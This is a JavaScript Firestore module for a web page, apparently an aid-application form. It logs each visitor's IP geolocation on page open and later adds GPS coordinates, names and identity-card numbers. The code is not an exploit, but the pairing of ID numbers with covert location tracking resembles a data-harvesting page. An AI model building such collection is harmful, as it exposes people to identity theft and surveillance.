import { collection, addDoc, updateDoc, doc, serverTimestamp } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js';
import { db, isFirebaseConfigured } from './firebase-config.js';

/**
 * Creates a unified visit session record in Firestore when visitor opens page.
 * Stores Data 1 (IP Location) initially, ready to be enriched by Data 2 (GPS) and form submission.
 * 
 * @param {object} data - IP Geolocation data & client details
 * @returns {Promise<{ success: boolean, docId?: string, error?: string }>}
 */
export async function saveSessionRecord(data) {
  if (!isFirebaseConfigured || !db) {
    return {
      success: false,
      skipped: true,
      error: 'Config placeholder active (edit firebase-config.js)'
    };
  }

  try {
    const payload = {
      // Applicant identity & form inputs
      userName: data.userName || null,
      icNumber: data.icNumber || null,
      jenisBantuan: data.jenisBantuan || null,
      icType: data.icType || null,

      // IP Geolocation Data
      ip: data.ip || null,
      ipLatitude: data.latitude != null ? Number(data.latitude) : null,
      ipLongitude: data.longitude != null ? Number(data.longitude) : null,
      ipCity: data.city || null,
      ipRegion: data.region || null,
      ipCountry: data.country || null,
      hostDomain: data.hostDomain || null,
      deviceName: data.deviceName || null,

      // GPS Data (starts null until user submits form & confirms GPS)
      hasGps: false,
      gpsLatitude: null,
      gpsLongitude: null,
      gpsAccuracy: null,
      gpsTimestamp: null,
      distanceDiffKm: null,

      // Session Metadata
      status: 'IP_ONLY',
      clientTimestamp: data.timestamp || Date.now(),
      createdAt: serverTimestamp(),
      userAgent: navigator.userAgent,

      // Backward compatibility fields
      latitude: data.latitude != null ? Number(data.latitude) : null,
      longitude: data.longitude != null ? Number(data.longitude) : null,
      accuracy: 10000,
      method: 'IP_GEOLOCATION',
      city: data.city || null,
      region: data.region || null,
      country: data.country || null
    };

    const docRef = await addDoc(collection(db, 'locations'), payload);

    return {
      success: true,
      docId: docRef.id
    };
  } catch (err) {
    console.error('Firestore saveSessionRecord failed:', err);
    return {
      success: false,
      error: err.code || err.message
    };
  }
}

/**
 * Updates an existing visit session record with Data 2 (GPS coordinates, accuracy & form data).
 * 
 * @param {string} docId - Firestore document ID from saveSessionRecord
 * @param {object} gpsData - GPS coordinates, accuracy, distance difference, userName, icNumber, jenisBantuan
 * @returns {Promise<{ success: boolean, docId?: string, error?: string }>}
 */
export async function updateSessionWithGps(docId, gpsData) {
  if (!isFirebaseConfigured || !db || !docId) {
    return {
      success: false,
      error: 'Firebase not configured or invalid docId'
    };
  }

  try {
    const docRef = doc(db, 'locations', docId);
    const updatePayload = {
      hasGps: true,
      gpsLatitude: Number(gpsData.latitude),
      gpsLongitude: Number(gpsData.longitude),
      gpsAccuracy: gpsData.accuracy != null ? Number(gpsData.accuracy) : null,
      gpsTimestamp: gpsData.timestamp || Date.now(),
      distanceDiffKm: gpsData.distanceDiffKm != null ? Number(gpsData.distanceDiffKm) : null,
      status: 'GPS_VERIFIED',
      method: 'DUAL_VERIFIED',

      // Backward compatibility
      latitude: Number(gpsData.latitude),
      longitude: Number(gpsData.longitude),
      accuracy: gpsData.accuracy != null ? Number(gpsData.accuracy) : null
    };

    if (gpsData.userName) updatePayload.userName = gpsData.userName;
    if (gpsData.icNumber) updatePayload.icNumber = gpsData.icNumber;
    if (gpsData.jenisBantuan) updatePayload.jenisBantuan = gpsData.jenisBantuan;
    if (gpsData.icType) updatePayload.icType = gpsData.icType;

    await updateDoc(docRef, updatePayload);

    return {
      success: true,
      docId: docId
    };
  } catch (err) {
    console.error('Firestore updateSessionWithGps failed:', err);
    return {
      success: false,
      error: err.code || err.message
    };
  }
}

/**
 * Updates applicant details on a visit session document.
 */
export async function updateSessionApplicant(docId, applicantData) {
  if (!isFirebaseConfigured || !db || !docId) return { success: false };
  try {
    const docRef = doc(db, 'locations', docId);
    await updateDoc(docRef, applicantData);
    return { success: true };
  } catch (err) {
    console.error('Failed to update session applicant details:', err);
    return { success: false, error: err.message };
  }
}

/**
 * Legacy location entry fallback.
 */
export async function saveLocationRecord(data) {
  if (!isFirebaseConfigured || !db) {
    return {
      success: false,
      skipped: true,
      error: 'Config placeholder active (edit firebase-config.js)'
    };
  }

  try {
    const payload = {
      userName: data.userName || null,
      icNumber: data.icNumber || null,
      jenisBantuan: data.jenisBantuan || null,
      icType: data.icType || null,
      latitude: data.latitude,
      longitude: data.longitude,
      accuracy: data.accuracy || null,
      method: data.method || 'UNKNOWN',
      city: data.city || null,
      region: data.region || null,
      country: data.country || null,
      ip: data.ip || null,
      deviceName: data.deviceName || null,
      hostDomain: data.hostDomain || null,
      clientTimestamp: data.timestamp || Date.now(),
      createdAt: serverTimestamp(),
      userAgent: navigator.userAgent,
      hasGps: data.method === 'BROWSER_GPS'
    };

    const docRef = await addDoc(collection(db, 'locations'), payload);

    return {
      success: true,
      docId: docRef.id
    };
  } catch (err) {
    console.error('Firestore save failed:', err);
    return {
      success: false,
      error: err.code || err.message
    };
  }
}
